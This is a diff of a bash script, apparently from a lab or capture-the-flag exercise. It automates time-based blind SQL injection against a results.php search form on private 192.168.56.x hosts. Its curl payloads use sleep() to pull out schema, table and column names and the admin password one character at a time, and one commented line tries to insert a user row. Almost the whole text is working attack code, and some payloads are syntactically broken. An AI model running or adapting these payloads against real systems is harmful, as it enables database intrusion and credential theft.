@@ -4,36 +4,42 @@ curlfunc () {
     #version
     #curl --silent -XPOST --data-urlencode "search=mary' and if((select substring(version(),$1,1)) = '$i',sleep(2),false) and '1'='1" http://192.168.56.103/results.php >> output
     #column name substr
-    curl --silent -XPOST --data-urlencode "search=mary' and if((select substring(column_name,$j,1) from information_schema.columns where table_name = 'Users' LIMIT 1,1) = '$i',sleep(2),false) and '1'='1" http://192.168.56.104/results.php >> output
+    #curl --silent -XPOST --data-urlencode "search=mary' and if((select substring(column_name,$j,1) from information_schema.columns where table_schema = 'Users' 1) = '$i',sleep(2),false) and '1'='1" http://192.168.56.104/results.php >> output
+    #mysql.user
+    #curl --silent -XPOST --data-urlencode "search=mary' and if((select substring(privilege_type,$j,1) from information_schema.schema_privileges where Grantee LIKE '%dbuser%' and table_schema LIKE '%Users%' LIMIT 2,1) = '$i',sleep(2),false) and '1'='1" http://192.168.56.104/results.php >> output
     #bla
     #curl --silent -XPOST --data-urlencode "search=-1' and union select null,table_name,2,3,4,5 from information_schema.tables where table_schema = 'staff' LIMIT 1) = '$i',sleep(2),false) and '1'='1" http://192.168.56.103/results.php
     #table name substr
     #curl --silent -XPOST --data-urlencode "search=mary' and if((select substring(bind_address,$j,1) from information_schema.processlist where ID = connection_id() LIMIT 1,1) = '$i',sleep(1),false) and '1'='1" http://192.168.56.104/results.php >> output
     #username substr
-    #curl --silent -XPOST --data-urlencode "search=mary' and if((select substring(username,$j,1) from Users where username LIKE '%' LIMIT 2,1) = '$i',sleep(1),false) and '1'='1" http://192.168.56.104/results.php >> output
-    
+    #curl --silent -XPOST --data-urlencode "search=mary' and if((select substring(password,$j,1) from Users where username LIKE 'admin' LIMIT 1) = '$i',sleep(1),false) and '1'='1" http://192.168.56.104/results.php >> output
+    #testing insert
+    #curl --silent -XPOST --data-urlencode "search=mary' and insert into Users VALUES (1,'core','856f5de590ef37314e7c3bdf6f8a66dc') LIMIT 1) = '$i',sleep(1),false) and '1'='1" http://192.168.56.104/results.php >> output
+    #substr data staffdetails
     #curl --silent -XPOST --data-urlencode "search=mary' and if((select substring(firstname,$j,1) from StaffDetails where firstname LIKE '%' LIMIT 3,1) = '$i',sleep(1),false) and '1'='1" http://192.168.56.104/results.php >> output
     #password len
-    #curl --silent -XPOST --data-urlenc55ode "search=mary' and if((select length(username,$j,1) from Users where username LIKE 'admin' LIMIT 1) = '$i',sleep(1),false) and '1'='1" http://192.168.56.104/results.php >> output
+    #curl --silent -XPOST --data-urlencode "search=mary' and if((select length(column_name) from information_schema.columns where column_name LIKE '%userid%' LIMIT 1) = '$i',sleep(1),false) and '1'='1" http://192.168.56.104/results.php >> output
     #schema name substr
-    #curl --silent -XPOST --data-urlencode "search=mary' and if(select substring(schema_name,$j,1) FROM information_schema.schemata where schema_name LIKE '%' LIMIT 1) = '$i', sleep(1), false) and '1'='1" http://192.168.56.104/results.php >> output
-    #curl --silent -XPOST --data-urlencode "search=mary' and if((select substring(table_name,$j,1) from information_schema.tables where table_schema = 'Users' LIMIT 2,1) = '$i',sleep(2),false) and '1'='1" http://192.168.56.103/results.php >> output
+    #curl --silent -XPOST --data-urlencode "search=mary' and if(select substring(schema_name,$j,1) as 'Database' FROM information_schema.schemata where schema_name LIKE '%' LIMIT 1) = '$i', sleep(1), false) and '1'='1" http://192.168.56.104/results.php >> output
+    curl --silent -XPOST --data-urlencode "search=mary' and if((select substring(column_name,$j,1) from information_schema.columns where table_name = 'Users' LIMIT 4,1) = '$i',sleep(1),false) and '1'='1" http://192.168.56.104/results.php >> output
 }
 
 #case $func in
 #(*[[:alpha:]]*)
-for (( j=0; j<=$1; j++ ))
+for (( j=1; j<=$1; j++ ))
 do
     for i in {a..z}
     do
     echo "[*] trying "$i"..."
     curlfunc "$j" "$i"
+    sleep 0.05
     done
     #(*[![:alpha:]]*)
-    for i in {0..9}
+    for i in {0..15}
     do
     echo "[*] trying "$i"..."
     curlfunc "$j" "$i"
+    sleep 0.05
     done
 done
 
